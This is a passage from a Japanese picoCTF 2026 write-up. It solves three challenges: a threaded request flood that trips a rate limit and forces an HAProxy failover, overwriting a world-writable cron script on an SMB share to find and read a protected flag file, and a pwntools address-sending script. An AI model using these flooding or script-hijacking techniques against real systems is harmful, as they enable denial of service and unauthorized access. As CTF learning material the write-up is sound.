    app=app,
    default_limits=["300 per minute"]
)

# Custom error handler for rate limit exceeded
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    print("value:", os.getenv("IS_BACKUP"))
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

flagは`IS_BACKUP`が`yes`に設定されているサーバーにしか存在しません。また、`300 per minute`というレート制限がかけられており、**これを超えると503エラーが返される仕組みになっています。**

次に`haproxy.cfg`を見ていきます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat haproxy.cfg 
# haproxy.cfg
global
    log stdout format raw local0
    maxconn 1000

defaults
    log global
    mode http
    timeout connect 5s
    timeout client 10s
    timeout server 10s
    
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

ユーザーは直接Flaskにアクセスするのではなく、このHAProxyを経由します。

1. 普段はメインの`s1`サーバーに繋がる。

2. `s2`は`backup`と指定されているため、普段はアクセスできない（ここにフラグがある！）。

3. HAProxyは2秒ごと（`inter 2s`）に`/`にアクセスしてヘルスチェックを行っている。

4. ステータスが`200`以外の応答が2回連続（`fall 2`）続くと、バックアップの`s2`にフェイルオーバー（切り替え）される。

つまり、**1分間に300回以上のリクエストをメインサーバー（s1）に叩き込み、わざとレート制限（503エラー）を発生させると、HAProxyのヘルスチェックも503エラーを受け取るため、フラグを持っているs2に繋げてくれるはず**です。

方針が決まったので、まずはPythonの`for`ループを使って350回リクエストを送るスクリプトを書きました。

```python
# 一部抜粋
for i in range(350):
    try:
        r = requests.get(url)
        
        # 進行状況を見やすくするために50回ごとにログを出力
        if (i + 1) % 50 == 0:
            print(f"  -> {i + 1}発 完了 (現在のステータス: {r.status_code})")
            
    except requests.exceptions.RequestException as e:
        print(f"通信エラー: {e}")
```

上記のようなforループのコードでは、「リクエストを送る → 返事を待つ → 次を送る」という同期処理になってしまい、ネットワークの通信待ち時間が発生するため、リクエストを送るスピードが遅く、503エラーを発生させることができませんでした。

そこで、以下のように並列処理を用いるコードに改良しました。

```python
import requests
import concurrent.futures
import time

url = "http://mysterious-sea.picoctf.net:50840/" # 最後に / を入れる

def send_request(i):
    try:
        r = requests.get(url)
        return r.status_code
    except Exception:
        return None

print("[*] マルチスレッド弾幕開始 (50並列)...")

# max_workers=50 で、50本のリクエストを同時に走らせる
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    # 350回分のリクエストを一気に発射
    results = list(executor.map(send_request, range(350)))

# 結果の集計（503エラーが何回出たか）
error_count = results.count(503)
print(f"[*] 弾幕完了。503エラーの発生回数: {error_count} 回")

if error_count > 0:
    # HAProxyがダウン判定するまで待機（2秒 × 2回 = 最低4秒。余裕を見て6秒待つ
    time.sleep(6)

    print("\n[*] フェイルオーバー完了。\n")
    print(requests.get(url).text)
else:
    print("[!] 503エラーが出ませんでした。")
```

このコードを実行することで、無事にflagを回収することができました。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ python3 failover.py                                                   
[*] 開始
[*] マルチスレッド弾幕開始 (50並列)...
[*] 弾幕完了。503エラーの発生回数: 59 回
[*] 成功！

[*] フェイルオーバー完了

[...]
            
<h1>Welcome!!</h1>
<p>picoCTF{f41l0v3r_f0r_7h3_w1n_73050a63}</p>

[...]
```

# Printer Shares 3

まずは`smbclient`を使って、パスワードなし（`-N`）でアクセスできる共有フォルダを探します

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient -L //dolphin-cove.picoctf.net/ -p 59477 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
```

今回もパスワード不要の`shares`と、内部用の`secure-shares`が見つかりました。`shares`の中身を覗いてみます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ smbclient //dolphin-cove.picoctf.net/shares -p 59477 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 11 00:16:01 2026
  ..                                  D        0  Wed Mar 11 00:16:01 2026
  script.sh                           N       73  Thu Feb  5 06:22:17 2026
  cron.log                            N      344  Wed Mar 11 00:23:01 2026
```

`script.sh`と`cron.log`という2つのファイルがありました。これを手元にダウンロード（`get`）して中身を確認します。

```
smb: \> get cron.log
getting file \cron.log of size 344 as cron.log (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get script.sh
getting file \script.sh of size 73 as script.sh (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit
```

`script.sh`と`cron.log`は以下のようになっていました。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat cron.log
Health Check: Tue Mar 10 15:16:01 UTC 2026
Health Check: Tue Mar 10 15:17:01 UTC 2026
Health Check: Tue Mar 10 15:18:01 UTC 2026
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat script.sh 
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"
```

これは**LinuxのCronという自動実行機能です。`script.sh`は誰でも書き換え可能な`shares`に置かれているため、今回はこれを悪用します。**

まず、サーバー全体から`flag`が含まれるファイルを探して出力するようなシェルスクリプトに書き換えます。

```
#!/bin/bash
# this script runs every minute
find / -name "*flag*" 2>/dev/null
```

これを`smbclient`の`put`コマンドで、サーバー上の`shares`に上書きアップロードします。

```
smb: \> put script.sh
```

1分ほど待ってから、結果が記録された cron.log を再度ダウンロード（`get`）して中身を見ます。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat cron.log 
[...]
/challenge/secure-shares/flag.txt
```

`/challenge/secure-shares/`ディレクトリ内に、`flag.txt`を発見しました！

あとは同じ手順で`script.sh`を`cat /challenge/secure-shares/flag.txt`に書き換え、再度アップロードして1分待つだけです。
更新された`cron.log`を確認すると、無事にflagを獲得することができました！

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ cat cron.log
[...]
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_0eb29140}
```

:::note info
外部から`smbclient`で直接`secure-shares`にアクセスしようとすれば、Sambaに「パスワードを入れろ」とブロックされてしまいます。
しかし、今回コマンドを実行したのは外部からではなく、サーバーの内側にいる「Cronデーモン」です。Cronはシステムの管理用として、多くの場合`root`権限で動いています。
:::


# bytemancy 3

これが最終問題です！まず、配布された`app.py`を読むと以下のように書かれていました。

```
I will name four procedures hidden inside spellbook.
Each round, send me their *raw* 4-byte addresses in little-endian form.
```
関数は`app.py`の中で以下のように定義されていました。
```python
SPELLBOOK_FUNCTIONS = [
    "ember_sigil",
    "glyph_conflux",
    "astral_spark",
    "binding_word",
]
```

これは、「`spellbook`の中に隠された4つの関数の名前を言うから、そのメモリアドレスを「生バイト」かつ「リトルエンディアン形式」で送れ」ということです。(`spellbook`は配布されているバイナリファイルです。)

ということで、まずは手元にある`spellbook`から、対象となる関数のアドレスを探し出します。今回はLinuxの`nm`コマンドを用いました。

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ nm spellbook | grep -E "ember_sigil|glyph_conflux|astral_spark|binding_word"
080491c1 T astral_spark
080491e3 T binding_word
08049176 T ember_sigil
0804919a T glyph_conflux
```

4つの関数のメモリアドレスが判明しました。

問題の指定にある 「リトルエンディアン形式 (little-endian)」 とは、コンピューターが複数バイトのデータをメモリに配置する際、「下の桁から順番に並べる」というデータ構造のルールです。
例えば`astral_spark`のアドレス`0x080491c1`を生のバイトデータで送る場合、そのまま`\x08\x04\x91\xc1`と送るのではなく、逆から`\xc1\x91\x04\x08`と送る必要があります。

https://wa3.i-3-i.info/word11428.html

これを手作業で変換するのは大変ですが、Pythonの`pwntools`というライブラリにある`p32()`という関数を使えば、一瞬で32ビットのリトルエンディアン形式に変換してくれます。

ここまでのことを踏まえて、特定したアドレスと`pwntools`を組み合わせて、サーバーの質問を自動で読み取り、正しいアドレスを即座に返し続ける自動化スクリプトを作成しました。

```python
from pwn import *

# 1. 接続先の設定
host = 'green-hill.picoctf.net'
port = 64890 
io = remote(host, port)

# 2. 関数名とアドレスの対応表 
addrs = {
    "astral_spark": p32(0x080491c1),
    "binding_word": p32(0x080491e3),
    "ember_sigil": p32(0x08049176),
    "glyph_conflux": p32(0x0804919a),
}

print("--- 詠唱開始 ---")

# 3. 3回連続で質問に答える
for i in range(3):
    # 質問文（...procedure '関数名'）を読み取る
    io.recvuntil(b"procedure '")
    # 関数名だけを抽出
    func_name = io.recvuntil(b"'").decode().strip("'")
    
    print(f"[{i+1}/3] 要求された関数: {func_name}")
    
    # 対応するバイナリアドレスを送信
    io.send(addrs[func_name])
    print(f"      => 送信アドレス: {addrs[func_name].hex()}")

# 4. 最後にフラグを受け取って表示
print("--- 結末 ---")
print(io.recvall().decode())
```

このスクリプトを実行することで、flagを獲得することができました！

```
┌──(kali㉿kali)-[~/PicoCTF2026]
└─$ python3 solve.py                  
[+] Opening connection to green-hill.picoctf.net on port 64890: Done
--- 詠唱開始 ---
[1/3] 要求された関数: glyph_conflux
      => 送信アドレス: 9a910408
[2/3] 要求された関数: astral_spark
      => 送信アドレス: c1910408
[3/3] 要求された関数: ember_sigil
      => 送信アドレス: 76910408
--- 結末 ---
[+] Receiving all data: Done (38B)
[*] Closed connection to green-hill.picoctf.net port 64890
.
==> picoCTF{0bjdump_m4g1c_9ee35d3a}
```

# まとめと感想

今回はpicoCTF2026のGeneral Skillsのwriteupを作成してみました。基礎的な分野ではありますが、全問完答し、こうして解説として言語化できたことは自分にとって大きな自信になりました。

しかし、そのあとに挑戦したBinary Exploitationでは一問難問があり、今回のCTFではその難問を解くことはできず、そこはチームメイトに助けられることとなりました。また、他の分野でも難問を解くことはできず、結果的にチームメイトに助けられる結果となりました。 悔しい反面、難問を解き明かすチームメイトの姿を見て、さらにセキュリティへのモチベーションが上がりました。

いつか自分も難問が解けるように、諦めずに学習を続けていきます！また、今回のCTFでBinary Exploitationについて興味を持ったので、その分野の勉強も本格的に始めていこうと思います！